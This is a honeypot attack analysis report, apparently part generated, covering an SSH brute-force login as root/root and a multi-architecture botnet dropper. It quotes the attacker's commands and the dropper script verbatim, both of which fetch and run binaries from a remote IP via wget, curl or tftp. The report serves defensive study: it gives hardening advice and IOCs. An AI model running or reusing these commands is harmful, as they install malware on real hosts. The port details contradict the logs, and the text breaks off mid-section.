1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308513 BigDshield kernel:[43400.097247]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=26245 DF PROTO=TCP SPT=56388 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308515 BigDshield kernel:[43401.767936]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=24214 DF PROTO=TCP SPT=56398 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308519 BigDshield kernel:[43405.600321]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=53984 DF PROTO=TCP SPT=56402 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308524 BigDshield kernel:[43411.394532]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1648 DF PROTO=TCP SPT=54312 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701308526 BigDshield kernel:[43413.053813]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=18722 DF PROTO=TCP SPT=54330 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701415105 BigDshield kernel:[63589.765910]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=40 TOS=0x08 PREC=0x20 TTL=235 ID=54321 PROTO=TCP SPT=40738 DPT=22 WINDOW=65535 RES=0x00 SYN URGP=0 
1701510690 BigDshield kernel:[72776.417428]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=159 DF PROTO=TCP SPT=33118 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510702 BigDshield kernel:[72787.632261]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=29614 DF PROTO=TCP SPT=48530 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510711 BigDshield kernel:[72796.609507]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=1047 DF PROTO=TCP SPT=53024 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 
1701510721 BigDshield kernel:[72806.617383]  DSHIELDINPUT IN=eth0 OUT= MAC=06:a6:67:a1:06:97:06:47:24:e8:0b:15:08:00 SRC=204.76.203.13 DST=172.31.5.68 LEN=60 TOS=0x08 PREC=0x20 TTL=44 ID=41618 DF PROTO=TCP SPT=48886 DPT=22 WINDOW=64240 RES=0x00 SYN URGP=0 

```
COMMENTARY ON LOGS
</details>

---


<details>
<summary>
<h1>IP and Ports</h1>
</summary>

The IP addresses and ports involved in the attack are as follows:

- Source IP: `204.76.203.13` (attacker's IP)
- Destination IP: `172.31.5.68` (honeypot's IP)
- Source Ports (used by the attacker): `56388`, `56398`, `56402`, `54312`, `54330`
- Destination Port (honeypot's SSH port): `2222`

Please note that these are the ports from which the attacker established their connections. There could be other ports used for the downloads or data exfiltration that are not listed.

<details>
<summary>
<h3>Top 1 Source Ips</h3>
</summary>

Total Source IPs: `5`
Unique: `1`

| Source IP | Times Seen |
| --- | --- |
| `204.76.203.13` | `5` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ips</h3>
</summary>

Total Destination IPs: `5`
Unique: `1`

| Destination IP | Times Seen |
| --- | --- |
| `172.31.5.68` | `5` |

</details>

---


<details>
<summary>
<h3>Top 5 Source Ports</h3>
</summary>

Total Source Ports: `5`
Unique: `5`

| Source Port | Times Seen |
| --- | --- |
| `56388` | `1` |
| `56398` | `1` |
| `56402` | `1` |
| `54312` | `1` |
| `54330` | `1` |

</details>

---


<details>
<summary>
<h3>Top 1 Destination Ports</h3>
</summary>

Total Destination Ports: `5`
Unique: `1`

| Destination Port | Times Seen |
| --- | --- |
| `2222` | `5` |

</details>

---


</details>

---


<details>
<summary>
<h1>SSH Analysis</h1>
</summary>

The SSH data shows that during the attack, the attacker was using an SSH client that identifies itself as libssh2 version 1.10.0, which is a library for implementing SSH2 protocol clients. The reported version shown is `"SSH-2.0-libssh2_1.10.0"`. No SSH handshake hashes (`ssh_hasshs`) were reported, which means there is no additional SSH fingerprint data available. However, the consistent use of the same SSH client version suggests the attacker may have been using an automated script or tool to attempt SSH connections or carry out the attack. The version information can be useful for understanding the capabilities and possibly the origin of the tools used by the attacker.

<details>
<summary>
<h3>Top 3 Usernames</h3>
</summary>

Total Usernames: `5`
Unique: `3`

| Username | Times Seen |
| --- | --- |
| `admin` | `3` |
| `ubnt` | `1` |
| `root` | `1` |

</details>

---


![Username](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-usernames.png)
<details>
<summary>
<h3>Top 5 Passwords</h3>
</summary>

Total Passwords: `5`
Unique: `5`

| Password | Times Seen |
| --- | --- |
| `admin` | `1` |
| `password` | `1` |
| `ubnt` | `1` |
| `123456` | `1` |
| `root` | `1` |

</details>

---


![Password](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-passwords.png)
<details>
<summary>
<h3>Top 5 Username/Password Pairs</h3>
</summary>

Total Username/Password Pairs: `5`
Unique: `5`

| Username/Password Pair | Times Seen |
| --- | --- |
| `('admin', 'admin')` | `1` |
| `('admin', 'password')` | `1` |
| `('ubnt', 'ubnt')` | `1` |
| `('admin', '123456')` | `1` |
| `('root', 'root')` | `1` |

</details>

---


![Username/Password Pair](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-login_pairs.png)
<details>
<summary>
<h3>Top 1 Successful Usernames</h3>
</summary>

Total Successful Usernames: `1`
Unique: `1`

| Successful Username | Times Seen |
| --- | --- |
| `root` | `1` |

</details>

---


![Successful Username](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_usernames.png)
<details>
<summary>
<h3>Top 1 Successful Passwords</h3>
</summary>

Total Successful Passwords: `1`
Unique: `1`

| Successful Password | Times Seen |
| --- | --- |
| `root` | `1` |

</details>

---


![Successful Password](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_passwords.png)
<details>
<summary>
<h3>Top 1 Successful Username/Password Pairs</h3>
</summary>

Total Successful Username/Password Pairs: `1`
Unique: `1`

| Successful Username/Password Pair | Times Seen |
| --- | --- |
| `('root', 'root')` | `1` |

</details>

---


![Successful Username/Password Pair](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-successful_login_pairs.png)
<details>
<summary>
<h3>Top 1 Ssh Versions</h3>
</summary>

Total SSH Versions: `5`
Unique: `1`

| SSH Version | Times Seen |
| --- | --- |
| `SSH-2.0-libssh2_1.10.0` | `5` |

</details>

---


![SSH Version](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-ssh_versions.png)
<details>
<summary>
<h3>Top 1 Ssh Hasshs</h3>
</summary>

Total SSH Hasshs: `5`
Unique: `1`

| SSH Hassh | Times Seen |
| --- | --- |
| `63ae64767f334c6a74647d80edb0291e` | `5` |

</details>

---


![SSH Hassh](/Users/lucasfaudman/Documents/SANS/internship/tests/attacks/graphs/fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054/pie-ssh_hasshs.png)
</details>

---


# Commands Used
This attack used a total of `9` inputs to execute the following `17` commands:
The commands used in the attack are as follows:

1. `enable`: This command is often used to enter privileged mode on network devices, such as routers and switches. It looks like the attacker was trying common network equipment commands.
2. `system`: Similarly to `enable`, this is likely another attempt at finding a command-line interface for network management systems.
3. `shell`, `sh`, `linuxshell`: These commands indicate attempts to open a shell environment, either with the assumption that `shell` or `sh` is an alias for the shell, or looking for a custom-named `linuxshell` command.
4. `cd /tmp/; echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai`: This is a series of commands concatenated with `;`. They change the directory to `/tmp/`, create a file called `rootsenpai` with the content "senpai", display its content, and then remove it. This could be a test to check if the system is writable and the attacker has enough permissions.
5. A complex `for` loop script that searches for deleted files still in use by processes (`grep -q \"(deleted)\" \"$dir/maps\"`) and then kills those processes (`kill -9 $(basename $dir)`). It ends with downloading an executable (`ah`) from `http://94.156.68.152`, making it executable (`chmod 777 ah`), running it, and then removing it. This indicates the attacker downloaded and executed malicious software.
6. `basename $dir`: This command extracts the directory base name, which was used in the `for` loop to extract PID values from the path.

Overall, the attacker attempted to gain higher privileges, executed tests to see if they could manipulate the file system, and then downloaded and executed a potentially malicious file.

<details>
<summary>
<h2>Raw Command Inputs</h2>
</summary>

The attacker entered the following `9` inputs on the honeypot system:

**Input 1:**
```bash
enable
```

**Input 2:**
```bash
system
```

**Input 3:**
```bash
shell
```

**Input 4:**
```bash
sh
```

**Input 5:**
```bash
linuxshell
```

**Input 6:**
```bash
cd /tmp/; echo "senpai" > rootsenpai; cat rootsenpai; rm -rf rootsenpai
```

**Input 7:**
```bash
for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;; rm -rf ah; wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152; chmod 777 ah;./ah ssh; rm -rf ah
```

**Input 8:**
```bash
basename $dir
```

**Input 9:**
```bash
basename $dir
```

</details>

---


<details>
<summary>
<h2>Commands Explained</h2>
</summary>

The following `17` commands were executed on the honeypot system:

```bash
enable
system
shell
sh
```
These commands (`enable`, `system`, `shell`, `sh`, `linuxshell`) appear to be an attempt to **gain privileged shell access** on the device. The context and effectiveness depend on the specific device/system and whether those commands are valid. They could be targeting a Cisco IOS-like CLI (`enable`, `system`) or attempting various common command names (`shell`, `sh`, `linuxshell`) to drop into a Unix shell.
```bash
cd /tmp/
```
The attacker **changes the current working directory** to `/tmp/`, which is typically writable by any user and often used for temporary file storage during such attacks.
```bash
echo "senpai" > rootsenpai
```
The attacker executes `echo` to **create a file** with the content `senpai` and names it `rootsenpai` in the `/tmp/` directory. With `cat`, they **display the contents** of the created file, likely to confirm that the file write operation was successful.
```bash
rm -rf rootsenpai
```
The attacker **deletes the file** `rootsenpai` from the `/tmp/` directory, possibly to cover their tracks or because the file was just for a test.
```bash
for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;
```
This command is a **for loop** that searches through the directories representing processes in `/proc/` for files named `maps`. It looks for strings containing `"(deleted)"`, which would indicate a memory-mapped file that has been deleted but is still in use. If found, it reports the finding and **kills the associated process** using its PID (`kill -9 $(basename $dir)`). This may be intended to disrupt certain processes, perhaps to evade detection, free a file lock, or affect the system's behavior.
```bash
rm -rf ah
```
After executing their payload, the attacker **removes the file** `ah`, again likely to cover their tracks.
```bash
wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152
```
The attacker uses multiple methods (`wget`, `curl`, `tftp`) to **download a file** named `ah` from a remote server with the IP address `94.156.68.152`. This shows redundancy in their approach, ensuring at least one method succeeds if others are blocked or unavailable.
```bash
chmod 777 ah
```
Upon successful download, the attacker uses `chmod` to set all permissions (`777`) for the file `ah`, allowing any user to **execute, read, or write the file**.
```bash
./ah ssh
```
The attacker **executes** the downloaded file `ah` with the argument `ssh`, which might indicate that this is a custom script or binary intended to establish an SSH connection or manipulate SSH service/key files.
```bash
basename $dir
```
These commands use `basename`, which **strips the directory portion from a given path**, and returns only the name of the file. However, as they are standalone, they are likely **mistyped commands** or part of a script that was not copied in full.
</details>

---



# Malware Analysis

Briefly explain the malware used in the attack.
This attack downloaded `2` raw malware samples which can be standardized into `2` samples:

### Raw Malware Samples

<details>
<summary>
<h4>Raw Malware Sample 0/2 Sha256 HASH: fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054</h4>
</summary>

**Standardized** Sha256 HASH: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`

**Sample Below** Sha256 HASH: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
```bash
binarys="jklmips jklmpsl jklarm jklarm5 jklarm6 jklarm7 jklx86 jklppc jklspc jklm68k"
server_ip="94.156.68.152"
output="vh"

for arch in $binarys
do
rm -rf $arch
rm -rf $output
wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output
chmod 777 $output
./$output $1
rm -rf $arch
rm -rf $output
done
```
1 more samples with the same **Standardized** Sha256 HASH were found:

* `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`


</details>

---


<details>
<summary>
<h4>Raw Malware Sample 1/2 Sha256 HASH: 199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8</h4>
</summary>

**Standardized** Sha256 HASH: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`

**Sample Below** Sha256 HASH: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`
```Unknown
senpai

```
1 more samples with the same **Standardized** Sha256 HASH were found:

* `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`


</details>

---


### Commented Malware Samples & Explanations

<details>
<summary>
<h4>
Standardized Malware Sample 0/2 Sha256 HASH: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`</h4>
</summary>


```bash
# The following shell script defines a list of binary names and sets server IP details and output file name.
binarys="jklmips jklmpsl jklarm jklarm5 jklarm6 jklarm7 jklx86 jklppc jklspc jklm68k"
server_ip="94.156.68.152"
output="vh"

# Iterate through each binary.
for arch in $binarys
do
    # Remove any existing instances of the binary and output file.
    rm -rf $arch
    rm -rf $output
    
    # Attempt to download the binary from the server using wget, curl or tftp.
    wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output
    
    # Make the downloaded file executable.
    chmod 777 $output
    
    # Execute the downloaded file, passing any arguments supplied to the script.
    ./$output $1
    
    # Clean up: remove the binary and output file.
    rm -rf $arch
    rm -rf $output
done
```

</details>

---

This shell script appears to be a multi-architecture malware dropper. It systematically attempts to download and execute payloads from a remote server for various architectures, meaning it is designed to infect different types of Linux systems (e.g., MIPS, ARM, x86). Here's a breakdown of what the script does:

1. It defines a series of binary names which are presumably tailored for specific system architectures.
2. It sets a server IP address, from which the malware will be downloaded. In this case, the IP is `94.156.68.152`.
3. It sets an output file name, `vh`, which will be used for the downloaded binary.
4. It uses a for-loop to iterate through the list of binary names.
5. For each architecture, it first removes any previous instances of the binary or output file.
6. It then proceeds to use `wget`, `curl`, or `tftp` commands to download the corresponding binary from `http://94.156.68.152/bins/$arch`. If one method fails, it falls back to the next method.
7. Upon successfully downloading the file, it changes the permission of the downloaded file to make it executable by any user (`chmod 777`).
8. It then executes the potentially malicious binary, passing through any script arguments (`$1`).
9. Finally, it removes the binary and the output file, most likely in an attempt to hide its tracks.

The attacker executed commands that suggest they gained a shell on the system (`system`, `shell`, `sh`, `linuxshell`), changed to the `/tmp/` directory implying they intend to carry out operations in a directory that doesn't require special permissions, and finally, executed this shell script (`wget`ing it, making it executable, running it, and then removing it).
The use of `rm` commands prior to downloading ensures that no remnants of previous activity impede the malware installation, and the iteration through all possible architectures increases the chances that the malware will successfully execute on the target system. The use of different downloading mechanisms (`wget`, `curl`, `tftp`) shows the attacker's intention to succeed even in environments with limited downloading utilities.

<details>
<summary>
<h4>
Standardized Malware Sample 1/2 Sha256 HASH: `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`</h4>
</summary>


```Unknown
# This line is not valid Python code and appears to be more like a placeholder or marker.
senpai

```

</details>

---

The 'malware_source_code' provided is simply a string with the word 'senpai'. This is not valid Python code, nor does it represent any functional malware script by itself. It looks more akin to a placeholder or a marker which seems to have no impact or relation with the sequence of commands provided. It's unclear what 'senpai' stands for, and if it has any significance within the context of the commands executed on the honeypot system.

In contrast, if we turn our attention to the 'commands' field, it appears to outline a sequence of actions taken on the Linux honeypot system. This sequence suggests that the attacker gained system access, moved to a temporary directory, created a file named 'rootsenpai', used that file or checked its content, and then removed it. Furthermore, they attempted to remove processes related to deleted files, likely in an attempt to conceal their activities. They also attempted to download an external file named 'ah' from a specific IP using multiple methods (wget, curl, tftp) and then made that file executable with full permissions (chmod 777). The attacker then executed 'ah' with the argument 'ssh' and finally removed the 'ah' file.

The 'commands' field suggests the attacker was engaging in behavior typically associated with maintaining access to the system, executing payloads, and attempting to cover their tracks. The keyword 'senpai' may be a codeword or trigger word within the context of this specific threat actor's operations or simply a benign string with no associated functionality.


# Which vulnerability does the attack attempt to exploit?
The provided information doesn't explicitly state the exact vulnerability that is being exploited. However, I can make an educated guess based on the observed behavior of the attacker:

The attacker executed commands that are not typically part of a normal SSH session (`enable`, `system`, `shell`, etc.), which suggests they might have been probing for a specific type of insecure or misconfigured service—possibly a network device management interface. This could indicate an attempt to exploit default credentials or a known command injection vulnerability in such interfaces.

Moreover, the attacker downloaded and executed a file named `ah` from an external server. This file contained a script that downloaded additional binaries for various architectures and executed them. Without a specific CVE number or a known exploit name, it's not possible to determine the exact vulnerability from the information given.

To identify the vulnerability being exploited, we would typically analyze the malware code, system logs to see what changes it made to the system, or network traffic to see if the malware communicates with any known command and control servers associated with a specific vulnerability.

Exploit databases like CVE Details, Exploit Database, and the National Vulnerability Database (NVD) may provide information on vulnerabilities associated with the indicators we have (e.g., the SSH client version or the pattern of commands attempted), but without more details or contexts, such as system logs or file analysis, it's not possible to definitively identify the exploit used. Please provide additional information or system logs if available to further investigate the exploit used in this attack.


# MITRE ATT&CK
In the MITRE ATT&CK framework, which outlines the various tactics and techniques used by threat actors, this attack can be classified under several categories:

1. **Initial Access**
   - T1190: **Exploit Public-Facing Application** - The attacker may have tried to exploit a public-facing application or service (SSH in this case).

2. **Execution**
   - T1059: **Command and Scripting Interpreter** - The attacker used shell commands to execute actions.

3. **Persistence**
   - (Information not available unless the malware or commands were specifically designed to maintain persistence)

4. **Privilege Escalation**
   - (Information not available unless the attack specifically attempted to gain higher privileges beyond what was seen in the commands)

5. **Defense Evasion**
   - T1070: **Indicator Removal on Host** - The attacker used commands to delete files (`rm -rf rootsenpai` and others) to remove evidence of their presence.
   - T1027: **Obfuscated Files or Information** - The attacker may have used this technique since the malware was fetched and executed then erased.

6. **Credential Access**
   - (Information not available unless the attack involved theft or attempt to access credentials)

7. **Discovery**
   - (Information not available unless the attacker performed actions to discover more about the system)

8. **Lateral Movement**
   - (Information not available unless there's evidence of movement across the network)

9. **Collection**
   - (Information not available unless the attack involved data collection)

10. **Command and Control**
    - T1105: **Ingress Tool Transfer** - The attacker transferred tools or malicious software from an external server to the target system.

11. **Exfiltration**
    - (Information not available unless the attack involved data being exfiltrated)

12. **Impact**
    - (Information not available unless the commands were designed to damage, disrupt, or negatively impact business processes)

Without more context or details on the rest of the attacker's actions post-compromise, it's difficult to classify other aspects under the MITRE framework. As more information becomes available, other MITRE ATT&CK techniques may apply to this attack.

# What Is The Goal Of The Attack?
Based on the analysis of the commands used and the malware involved, the goals of the attack appear to be the following:

1. **Probe System Vulnerabilities**: The attacker used a series of generic commands (`enable`, `system`, `shell`, `sh`, `linuxshell`) that are typically associated with attempting to identify a vulnerable system or services that might be running.

2. **Gain Unauthorized Access**: The set of SSH-related commands, combined with the use of common network equipment commands, indicates an attempt to gain unauthorized access to the system or network infrastructure.

3. **Execute Arbitrary Code**: The attacker downloaded a script (`ah`) designed to fetch and execute binaries for various architectures. This is a clear indication of an attempt to run arbitrary code on the compromised system.

4. **Establish Persistence**: The exact purpose of the binaries fetched by the `ah` script is not stated, but such activity commonly intends to establish persistence on the infected host to maintain access.

5. **Evade Detection**: The attacker made efforts to remove traces by deleting the `rootsenpai` file they created and the `ah` script after execution, suggesting a desire to minimize forensic evidence and evade detection.

6. **Prep for Further Attacks**: The use of a malware script designed to download and execute additional payloads suggests that the attacker was preparing the system for further exploitation or use in botnet activities such as DDoS attacks, spamming, or other malicious activities.

Therefore, the goal of the attack seems to focus on reconnaissance, gaining unauthorized access, and staging for further exploitation or use of the compromised system for malicious purposes. It also emphasizes the attacker's intent to minimize their footprint to avoid detection and potential attribution.

# If The System Is Vulnerable, Would The Attack Will Be Successful?
The success of the attack largely depends on the security posture of the target system and whether it is vulnerable to the techniques used by the attacker. Here are some considerations to evaluate whether the attack could be successful if the system is vulnerable:

1. **Weak Credentials**: If default or weak credentials were in use and the attacker was attempting to exploit these, then the attack could succeed in gaining unauthorized access.

2. **Service Misconfiguration**: If the services on the target system, such as SSH, were misconfigured or using vulnerable versions, the attacker's attempts to gain shell access or execute commands could be successful.

3. **Executable Permissions**: The attacker's ability to download and execute files in `/tmp/` suggests they may have had write and execute permissions. If the system allows executables to be run from world-writable directories without restriction, this aspect of the attack could be successful.

4. **Lack of Antivirus/Anti-malware**: If the system lacks proper antivirus or anti-malware defenses, the downloaded malware might execute without being detected or stopped.

5. **No Intrusion Detection System (IDS)**: If the system did not have an IDS or the IDS was not configured to detect and prevent such attacks, the attacker's malicious activities could go unnoticed.

6. **Outdated System and Software**: If the system or its applications were not regularly updated, known vulnerabilities could be exploited by the attacker's tools and commands.

7. **Insufficient Monitoring and Alerting**: A lack of robust monitoring and alerting mechanisms could allow the attacker to conduct activities without triggering any alerts.

If the system has vulnerabilities that align with any of the attacker's methods, then the attack could be successful, allowing the attacker to achieve their objectives of reconnaissance, unauthorized access, execution of arbitrary code, potential persistence, and preparation for further attacks. Always having a strong defense-in-depth strategy, including regular updates, strong credentials, restricting executable permissions, and implementing thorough monitoring and detection capabilities, is key to preventing such attacks from succeeding.

# How Can A System Be Protected From This Attack?
To protect a system from the type of attack described, several best practices and security measures can be implemented. Here's a comprehensive list:

1. **Use Strong Authentication**:
   - Implement strong, unique passwords for all accounts, especially for privileged users.
   - Use multi-factor authentication (MFA) wherever possible to add an extra layer of security.

2. **Implement Network Security**:
   - Employ firewalls to restrict unnecessary inbound and outbound traffic.
   - Utilize a properly configured Intrusion Detection System (IDS) or Intrusion Prevention System (IPS) to detect and prevent malicious activities.

3. **Harden SSH Access**:
   - Disable root login via SSH.
   - Use SSH keys in place of passwords for added security.
   - Limit SSH access to specific IP addresses or networks where feasible.
   - Implement fail2ban or similar tools to block repeat offenders after several failed login attempts.

4. **Regularly Update Systems and Software**:
   - Keep the operating system and all software up to date with the latest security patches.
   - Regularly update antivirus and anti-malware solutions with the latest definitions.

5. **Restrict File Permissions**:
   - Use the principle of least privilege when setting file permissions—users should only have the permissions they need to perform their tasks.
   - Restrict the execution of binaries, especially in world-writable directories like `/tmp/`.

6. **Use Application Allowlists**:
   - Allowlist applications that can execute on the system, which helps prevent unauthorized applications from running.

7. **Monitor and Log Activities**:
   - Install security monitoring tools that alert on suspicious activities.
   - Enable and review system logs regularly to look for signs of intrusion.

8. **Security Awareness and Training**:
   - Educate users to recognize phishing attempts and other social engineering tactics.
   - Encourage responsible security practices among all users.

9. **Backup and Recovery Plan**:
   - Regularly back up critical system data and configurations.
   - Establish a disaster recovery plan to restore systems quickly if they are compromised.

10. **Incident Response Plan**:
    - Create and maintain an incident response plan to ensure swift action can be taken if an attack is detected.

11. **Network Segmentation and Isolation**:
    - Segment networks to limit lateral movement of attackers.
    - Isolate critical systems and networks as much as possible.

Implementing the above practices will significantly improve the system's security posture and make it more resistant to the type of attack observed. It is essential to maintain a culture of continual assessment and improvement to adapt to the evolving threat landscape.

# What Are The Indicators Of Compromise (Iocs) For This Attack?
Indicators of Compromise (IOCs) are evidence on a digital system that indicates potential intrusion or malicious activity. For this attack, the following IOCs can be identified:

1. **Malicious IP Addresses and URLs**:
   - Attacker's IP: `204.76.203.13`
   - Source of the 'ah' script: `http://94.156.68.152/ah`

2. **Malware File Hashes**:
   - SHA256 hash for the 'ah' script: `fe9291a4727da7f6f40763c058b88a5b0031ee5e1f6c8d71cc4b55387594c054`
   - SHA256 hash for the file "/tmp/rootsenpai": `199d11d0fd7043fe9206954ed8bc7b54d1912013a2a71bdf8bb007b71bb490c8`

3. **Suspicious Commands Executed**:
